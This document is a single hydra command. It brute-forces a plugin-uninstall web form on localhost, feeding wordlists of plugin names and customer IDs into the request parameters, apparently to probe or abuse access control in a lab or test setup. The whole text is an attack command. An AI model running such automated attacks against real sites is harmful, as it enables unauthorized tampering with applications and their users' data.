hydra -L plugin_names.txt -P userids.txt localhost http-get-form "/catalog/uninstall_plugin.php:customer_id=^PASS^&pluginName=^USER^:*" -o form_get.txt
